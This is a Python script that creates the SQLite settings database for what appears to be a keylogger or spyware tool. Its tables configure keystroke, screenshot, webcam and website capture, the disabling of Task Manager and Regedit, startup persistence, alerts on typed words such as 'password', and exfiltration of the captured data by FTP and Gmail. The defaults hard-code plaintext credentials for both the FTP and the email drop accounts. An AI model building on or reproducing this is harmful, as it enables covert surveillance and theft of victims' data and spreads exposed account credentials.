import sqlite3


db = open("database.db",'a+')
db.close()

conn = sqlite3.connect("database.db")

#conn.row_factory = lambda cursor, row: row[0]

c = conn.cursor()

try:
    # Users table
    # password is a hash string
    c.execute('''CREATE TABLE IF NOT EXISTS Users
            ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL )''')
    #General table
    c.execute('''CREATE TABLE IF NOT EXISTS General
              (id INTEGER NOT NULL UNIQUE , disTaskManager INTEGER NOT NULL DEFAULT 0,
            disRegedit INTEGER NOT NULL DEFAULT 0,encrlog INTEGER NOT NULL DEFAULT 0
            startup INTEGER NOT NULL DEFAULT 0, hotkey TEXT
             , FOREIGN KEY (id) REFERENCES Users(id))''')
    #FTP table
    c.execute('''CREATE TABLE IF NOT EXISTS FTP
             (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 0,
             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
            upKeystroke INTEGER NOT NULL DEFAULT 0, upScrshot INTEGER NOT NULL DEFAULT 0,
            upWebcam INTEGER NOT NULL DEFAULT 0, upWebsite INTEGER NOT NULL DEFAULT 0,
            upSize INTEGER NOT NULL DEFAULT 0, size INTEGER DEFAULT 5000, clear INTEGER NOT NULL DEFAULT 0
             , FOREIGN KEY (id) REFERENCES Users(id))''')
    # FTP server
    c.execute('''CREATE TABLE IF NOT EXISTS FTPServer
            (id INTEGER NOT NULL UNIQUE, hostname TEXT DEFAULT "ftp.drivehq.com",
            uname TEXT DEFAULT "batong96", password TEXT DEFAULT "2ebnjzfj", dir TEXT DEFAULT "/", passiveMode INTEGER DEFAULT 1
            , FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #webcam table
    c.execute('''CREATE TABLE IF NOT EXISTS Webcam
             (id INTEGER NOT NULL UNIQUE ,
             enable INTEGER NOT NULL DEFAULT 0,
             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0
             , FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #Target table
    c.execute('''CREATE TABLE IF NOT EXISTS Targets
             (id INTEGER NOT NULL UNIQUE, enAllApp INTEGER NOT NULL DEFAULT 1,
            enFollowApp INTEGER NOT NULL DEFAULT 0, FOREIGN KEY (id) REFERENCES Users(id))''')
    #Target list table
    c.execute('''CREATE TABLE IF NOT EXISTS TargetList
             (id INTEGER NOT NULL, byApp TEXT NOT NULL DEFAULT "shell",
             byName TEXT NOT NULL DEFAULT "shell", UNIQUE(byApp, byName),
             FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #screenshot table
    c.execute('''CREATE TABLE IF NOT EXISTS Screenshot
             (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 0, timeNuser INTEGER NOT NULL DEFAULT 0,
             doubleScr INTEGER NOT NULL DEFAULT 1, enDel INTEGER NOT NULL DEFAULT 0,
             daysDel INTEGER NOT NULL DEFAULT 3,
            hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0
             , quality INTEGER DEFAULT 50
             , FOREIGN KEY (id) REFERENCES Users(id))''')    
    #Email table
    c.execute('''CREATE TABLE IF NOT EXISTS Email
             (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 0,
                         hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
            upKeystroke INTEGER NOT NULL DEFAULT 0, upScrshot INTEGER NOT NULL DEFAULT 0,
            upWebcam INTEGER NOT NULL DEFAULT 0, upWebsite INTEGER NOT NULL DEFAULT 0,
            limitSize INTEGER DEFAULT 5000, clear INTEGER NOT NULL DEFAULT 0,
            zipPasswd TEXT, FOREIGN KEY (id) REFERENCES Users(id))''')
    #Email Delivery
    c.execute('''CREATE TABLE IF NOT EXISTS EmailDelivery
            ( id INTEGER NOT NULL UNIQUE, sendto TEXT DEFAULT "khongcotien0123@gmail.com"
            , smpt TEXT DEFAULT "smtp.gmail.com", port INTEGER DEFAULT 587,
            uname TEXT DEFAULT "khongcotien0123@gmail.com",
            password TEXT DEFAULT "khongcotien0123",FOREIGN KEY (id) REFERENCES Users(id))''')

    #Alerts table
    c.execute('''CREATE TABLE IF NOT EXISTS Alerts
             (id INTEGER NOT NULL UNIQUE , sendMail INTEGER NOT NULL DEFAULT 1,
             scrShot INTEGER NOT NULL DEFAULT 1, FOREIGN KEY (id) REFERENCES Users(id))''')
    #Alerts list table
    c.execute('''CREATE TABLE IF NOT EXISTS AlertList
             (id INTEGER NOT NULL, key TEXT NOT NULL DEFAULT "password", UNIQUE(key), FOREIGN KEY (id) REFERENCES Users(id))''')

    #current user
    c.execute('''CREATE TABLE IF NOT EXISTS current_user (id INTEGER)''')
    # add triger auto load default config
    c.execute('''CREATE TRIGGER IF NOT EXISTS aft_insert AFTER INSERT ON Users
        BEGIN
            INSERT INTO General(id) VALUES(NEW.id);
            
            INSERT INTO FTP(id) VALUES(NEW.id);
            INSERT INTO FTPServer(id) VALUES(NEW.id);
            
            INSERT INTO Webcam(id) VALUES (NEW.id);
            
            INSERT INTO Targets(id) VALUES(NEW.id);
            INSERT INTO TargetList(id) VALUES(NEW.id);
            
            INSERT INTO Screenshot(id) VALUES(NEW.id);
            
            INSERT INTO Email(id) VALUES (NEW.id);
            INSERT INTO EmailDelivery(id) VALUES(NEW.id);
            
            INSERT INTO Alerts(id) VALUES(NEW.id);
            INSERT INTO AlertList(id) VALUES(NEW.id);

        END; ''')
except Exception as ex:
    print(ex)


# Insert a row of data
#c.execute("INSERT INTO Users(username, password) VALUES ('user01','user01')")
#c.execute("INSERT INTO Users(username, password) VALUES ('user02','user02')")
#r = c.execute('SELECT * FROM Users').fetchall()
#print(r)
#----------------------
#c.execute("INSERT INTO Alerts VALUES (1,0,1)")
#s = c.execute('SELECT * FROM Alerts WHERE id =1').fetchone()
#print(s[0])
#c.execute("INSERT INTO AlertList VALUES (1,'pass')")
#print(c.execute('SELECT * FROM AlertList').fetchall())
#----------------------
#c.execute("INSERT INTO Targets VALUES (1,0,1)")
#c.execute("INSERT INTO TargetList VALUES (1,'notepad','notepad')")
#print(c.execute('SELECT * FROM TargetList WHERE id = 1').fetchall())
#print(c.execute('SELECT * FROM Targets WHERE id = 1').fetchone())
#c.execute("INSERT INTO current_user VALUES (1)")
#print(c.execute('SELECT * FROM current_user').fetchone())
# Save (commit) the changes
conn.commit()
'''
c.execute('SELECT key FROM Alerts')
listAlert = c.fetchall()

print(listAlert[0])
'''      
# We can also close the connection if we are done with it.
# Just be sure any changes have been committed or they will be lost.
conn.close()
